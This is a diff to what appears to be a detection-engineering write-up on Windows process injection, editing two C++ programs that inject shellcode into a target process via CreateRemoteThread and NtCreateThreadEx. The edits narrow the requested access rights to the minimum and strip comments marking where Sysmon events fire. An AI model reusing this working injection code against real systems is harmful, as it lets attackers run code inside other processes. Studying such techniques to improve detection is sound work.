@@ -136,7 +136,7 @@ The four API calls and what Sysmon sees at each step:
 | CreateRemoteThread()   | Win32   | EID 8        |
 
 ```
-// t1_classic_crt.cpp
+// t1_classic_crt_minimal.cpp
 #include "common.h"
 
 int main() {
@@ -147,13 +147,19 @@ int main() {
     }
     wprintf(L"[*] Target PID: %lu\n", pid);
 
-    // EID 10 fires here
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    // Minimum rights for CRT injection
+    HANDLE hProc = OpenProcess(
+        PROCESS_VM_WRITE          |   // WriteProcessMemory
+        PROCESS_VM_OPERATION      |   // VirtualAllocEx
+        PROCESS_CREATE_THREAD     |   // CreateRemoteThread
+        PROCESS_QUERY_INFORMATION,    // GetExitCodeThread
+        FALSE, pid
+    );
     if (!hProc) {
         wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
         return 1;
     }
-    wprintf(L"[+] Handle acquired\n");
+    wprintf(L"[+] Handle acquired — requested 0x143a\n");
 
     LPVOID remoteMem = VirtualAllocEx(
         hProc, NULL, shellcode_size,
@@ -173,7 +179,6 @@ int main() {
     }
     wprintf(L"[+] Shellcode written: %zu bytes\n", written);
 
-    // EID 8 fires here
     HANDLE hThread = CreateRemoteThread(
         hProc, NULL, 0,
         (LPTHREAD_START_ROUTINE)remoteMem,
@@ -318,7 +323,7 @@ Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRe
 // t2_ntcreatethreadex.cpp
 #include "common.h"
 
-typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
     PHANDLE             hThread,
     ACCESS_MASK         DesiredAccess,
     LPVOID              ObjectAttributes,
@@ -340,13 +345,19 @@ int main() {
     }
     wprintf(L"[*] Target PID: %lu\n", pid);
 
-    // EID 10 fires here
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    // Minimum rights for NtCreateThreadEx injection
+    HANDLE hProc = OpenProcess(
+        PROCESS_VM_WRITE          |   // WriteProcessMemory
+        PROCESS_VM_OPERATION      |   // VirtualAllocEx
+        PROCESS_CREATE_THREAD     |   // NtCreateThreadEx
+        PROCESS_QUERY_INFORMATION,    // NtQueryInformationProcess
+        FALSE, pid
+    );
     if (!hProc) {
         wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
         return 1;
     }
-    wprintf(L"[+] Handle acquired\n");
+    wprintf(L"[+] Handle acquired — requested 0x143a\n");
 
     LPVOID remoteMem = VirtualAllocEx(
         hProc, NULL, shellcode_size,
@@ -378,7 +389,6 @@ int main() {
     }
     wprintf(L"[+] NtCreateThreadEx resolved at: 0x%p\n", NtCreateThreadEx);
 
-    // EID 8 fires here — kernel sees same thread creation event as T1
     HANDLE hThread = NULL;
     NTSTATUS status = NtCreateThreadEx(
         &hThread,
@@ -387,7 +397,7 @@ int main() {
         hProc,
         (LPTHREAD_START_ROUTINE)remoteMem,
         NULL,
-        0,          // not suspended
+        0,
         0, 0, 0,
         NULL
     );
@@ -397,7 +407,7 @@ int main() {
         wprintf(L"[-] Thread creation failed\n");
         return 1;
     }
-    wprintf(L"[+] Remote thread created\n");
+    wprintf(L"[+] Remote thread created — requested 0x143a\n");
 
     WaitForSingleObject(hThread, 5000);
     CloseHandle(hThread);
